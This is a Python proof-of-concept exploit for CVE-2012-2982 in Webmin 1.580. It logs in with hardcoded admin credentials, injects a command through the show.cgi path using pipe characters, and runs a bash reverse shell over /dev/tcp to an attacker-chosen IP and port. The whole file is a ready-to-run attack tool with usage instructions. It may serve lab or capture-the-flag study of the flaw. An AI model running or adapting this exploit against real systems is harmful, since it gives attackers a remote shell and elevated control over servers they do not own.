# a proof of concpet script for CVE-2012-2982
# authenticated remote code execution gives high privileges access
# tested on webmin 1.580

import requests
import sys
try:
	target_ip = sys.argv[1]
	attacker_ip = sys.argv[2]
	attacker_port = sys.argv[3]
	data = {"page" : "%2F",  "user" : "admin",  "pass" : "adminrulez"}
	url = f"http://{target_ip}:10000/session_login.cgi"
	r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)
	if r.status_code == 302 and r.cookies["sid"] != None:
		print("[*] Login successfull executing the paylaod")
	else:
		print("[-] Login failed")
	sid = r.cookies["sid"]
	print("[*] comprimesed cookie is: "+ sid)
	paylaod = f"bash -c 'exec bash -i &>/dev/tcp/{attacker_ip}/{attacker_port}<&1'"
	exploit = f"http://{target_ip}:10000/file/show.cgi/bin/pwned|{paylaod}|"
	print("[*] target pwned successfully !")
	fr = requests.post(exploit , cookies={"sid":sid}, verify=False, allow_redirects=False)
	print(fr)
except KeyboardInterrupt:
	print("[-] exited")
except IndexError:
		print("[+] usage: python3 exploit.py TARGET_IP ATTACKER_IP LISTENING_PORT")
